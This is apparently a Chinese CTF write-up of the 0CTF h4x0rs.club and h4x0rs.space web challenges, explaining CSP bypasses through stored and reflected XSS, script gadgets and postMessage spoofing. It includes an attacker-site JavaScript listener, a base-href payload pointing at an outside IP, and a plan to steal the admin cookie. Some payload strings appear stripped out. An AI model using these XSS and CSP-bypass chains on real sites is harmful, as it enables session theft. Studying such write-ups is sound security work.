    Content-Security-Policy:default-src 'none'; img-src * data: ; script-src 'nonce-c8ebe81fcdccc3ac7833372f4a91fb90'; style-src 'self' 'unsafe-inline' fonts.googleapis.com; font-src 'self' fonts.gstatic.com; frame-src https://www.google.com/recaptcha/;
非常严格，只允许nonce CSP的script解析
index.php页面的CSP为
    Content-Security-Policy:script-src 'nonce-120bad5af0beb6b93aab418bead3d9ab' 'strict-dynamic';
允许sd CSP动态执行script（这里的出发点可能是index.php是加载游戏的地方，为了适应CSP，必须加入`strict-dynamic`。）
2、站内有两个xss点
第一个是user.php的profile，储存型xss，没有任何过滤。
第二个是index.php的msg参数，反射性xss，没有任何过滤，但是受限于xss auditor
顺着思路向下
因为user.php页面的CSP非常严格，我们需要跳出这个严格的地方，于是可以通过插入meta标签，跳转到index.php，在这里进一步操作
当然这里我们也可以利用储存型xss和页面内的一段js来构造a标签跳转。
在user.php的查看profile页面，我们可以看到
    if(location.hash.slice(1) == 'report'){
        document.getElementById('report-btn').click();
    }
当我们插入
并请求
    /game/user.php/ddog%23report
那么这里的a标签就会被点击，同样可以实现跳转。
接着我们探究index.php，这里我们的目标就是怎么能够绕过sd
CSP了，当时的第一个想法是``，通过修改当前页面的根域，我们可以加载其他域的js（听起来很棒！
可惜如果我们请求
    https://h4x0rs.club/game/?msg=
会被xss auditor拦截，最后面没办法加`/">`，一个非常有趣的情况出现了
    https://h4x0rs.club/game/?msg=%3Cbase%20href=%22http://115.28.78.16
最后的``中的`/`被转换成了路径，前面的左尖括号被拼入了域名中，后面的右尖括号闭合标签...一波神奇的操作...
不过这里因为没法处理尖括号域名的事情，所以置于后话不谈。
我们继续讨论绕过sd
CSP的思路，这种CSP已知只有一种办法，就是通过现在已有的js代码构造xss，这是一种在去年blackhat大会上google团队公布的CSP
Bypass技巧，叫做Script Gadgets。
这里的漏洞点和ppt中的思路不完全一致，但核心思路一样，都是要利用已有js代码中的一些点来构造利用。
站内关于游戏的代码在app.js中的最下面，加载了client.js
    function load_clientjs(){
        var s = document.createElement('script');
        document.body.appendChild(s);
        s.defer = true;
        s.src = '/game/javascripts/client.js';
    }
client.js中的代码不多，有一些值得注意的点，就是客户端是通过`postMessage`和服务端交互的。
而且所有的交互都没有对来源的校验，也就是可以接受任何域的请求。
**ps: 这是一个呆子不开口在2016年乌云峰会上提到的攻击手法，通过postMessage来伪造请求**
这样我们可以使用iframe标签来向beckend页面发送请求，通过这种方式来控制返回的消息。
这里我盗用了一张别的wp中的图，来更好的描述这种手法
原图来自
这里我们的exploit.html充当了中间人的决赛，代替客户端向服务端发送请求，来获取想要的返回
这里我们可以关注一下client.js中的recvmsg
如果我们能控制data.title，通过这里的dom xss，我们可以成功的绕过index.php下的sd CSP限制。
值得注意的是，如果我们试图通过index.php页面的反射性xss来引入iframe标签的话，如果iframe标签中的链接是外域，会被xss
auditor拦截。
所以这里需要用user.php的储存型xss跳出。这样利用链比较完整了。
#### 利用思路
1、首先我们需要注册两个账号，这里使用ddog123和ddog321两个账号。
2、在ddog321账号中设置profile公开，并设置内容为
3、在evil_website.com（这里有个很关键的tips，这里只能使用https站，否则会爆引入混合数据，阻止访问）的index.html向backend发送请求，这里的js需要设置ping和badges，在badges中设置title来引入js
    window.addEventListener("message", receiveMessage, false);
    var TOKEN,nonce;
    function receiveMessage(event)
    {
    console.log("msg");
    data = event.data;
    if(data.cmd =='ping'){
        TOKEN = data.TOKEN;
        nonce = data.nonce;
        game.postMessage(data,"*");
    }
    if(data.cmd =='badges'){
        console.log('badges');
        console.log(data);
        TOKEN = data.TOKEN;
        data.level = 1;
        data.title = '\'">';
        console.log(data.title);
        // data.title = '\'">';
        game.postMessage(data,"*");
    }
    }
4、在ddog123账户中设置profile为
5、最后在1.js中加入利用代码，发送report给后台等待返回即可。
### h4x0rs.space
TCTF/0CTF中的压轴题目，整个题目的利用思路都是近几年才被人们提出来的，这次比赛我也是第一次遇到环境，其中关于Appcache以及Service
Worker的利用方式非常有趣，能在特殊环境下起到意想不到的作用。
下面的Writeup主要来自于
#### 题目分析
    I've made a blog platform let you write your secret. 
    Nobody can know it since I enabled all of modern web security mechanism, is it cool, huh?
    Get document. cookie of the admin.
    h4x0rs.space
    Hint: Every bug you found has a reason, and you may want to check some uncommon HTML5 features Also notice that, the admin is using real browser, since I found out Headless is not much real-world. GL
    Hint 2: W3C defines everything, but sometimes browser developers decided to implement in their way, get the same browser to admin and test everything on it.
    Hint 3: Can you make "500 Internal Server Error" from a post /blog.php/{id} ? Make it fall, the good will come. And btw, you can solve without any automatic tool. Connect all the dots.
    Last Hint: CACHE
先简单说一下整个题目逻辑
1、站内是一个生成文章的网站，可以输入title，content，然后可以上传图片，值得注意的是，这里的所有输入都会被转义，生成的文章内容不存在xss点。
2、站内开启CSP，而且是比较严格的nonce CSP
    Content-Security-Policy:
    default-src none; frame-src https://h4x0rs.space/blog/untrusted_files/embed/embed.php https://www.google.com/recaptcha/; script-src 'nonce-05c13d07976dba84c4f29f4fd4921830'; style-src 'self' 'unsafe-inline' fonts.googleapis.com; font-src fonts.gstatic.com; img-src *; connect-src https://h4x0rs.space/blog/report.php;
3、文章内引入了类似短标签的方式可以插入部分标签，例如`[img]test[/img]`。
值得注意的是这里有一个特例
    case 'instagram':
        var dummy = document.createElement('div');
        dummy.innerHTML = ``; // dummy object since f.frameborder=0 doesn't work.
        var f = dummy.firstElementChild;
        var base = 'https://h4x0rs.space/blog/untrusted_files/embed/embed.php';
        if(e['name'] == 'youtube'){
            f.width = 500;
            f.height = 330;
            f.src = base+'?embed='+found[1]+'&p=youtube';
        } else if(e['name'] == 'instagram') {
            f.width = 350;
            f.height = 420;
            f.src = base+'?embed='+found[1]+'&p=instagram';
        }
        var d_iframe = document.createElement('div');
        d_iframe.id = 'embed'+iframes_delayed.length; // loading iframe at same time may cause overload. delay it.
        iframes_delayed.push( document.createElement('div').appendChild(f).parentElement.innerHTML /* hotfix: to get iframe html  */ );
        o.innerHTML = o.innerHTML.replace( found[0], d_iframe.outerHTML );
        break;
如果插入`[ig]123[/ig]`就会被转为引入`https://h4x0rs.space/blog/untrusted_files/embed/embed.php?embed=123&p=instagram`的iframe。
值得注意的是，embed.php中的embed这里存在反射性xss点，只要闭合注释就可以插入标签，遗憾的是这里仍然会被CSP限制。
    https://h4x0rs.space/blog/untrusted_files/embed/embed.php?embed=-->&p=instagram
4、站内有一个jsonp的接口，但不能传尖括号，后面的文章内容什么的也没办法逃逸双引号。
    https://h4x0rs.space/blog/pad.php?callback=render&id=c3c08256fa7df63ec4e9a81efa9c3db95e51147dd14733abc4145011cdf2bf9d
5、图片上传的接口可以上传SVG，图片在站内同源，并且不受到CSP的限制，我们可以在SVG中执行js代码，来绕过CSP，而重点就是，我们只能提交blog
id，我们需要找到一个办法来让它执行。
#### AppCache 的利用
在提示中，我们很明显可以看到`cache`这个提示，这里的提示其实是说，利用appcache来加载svg的方式。
在这之前，我们可能需要了解一下什么是Appcache。具体可以看这篇文章。
这是一种在数年前随H5诞生的一种可以让开发人员指定浏览器缓存哪些文件以供离线访问，在缓存情况下，即使用户在离线状态刷新页面也同样不会影响访问。
Appcache的开启方法是在html标签下添加manifest属性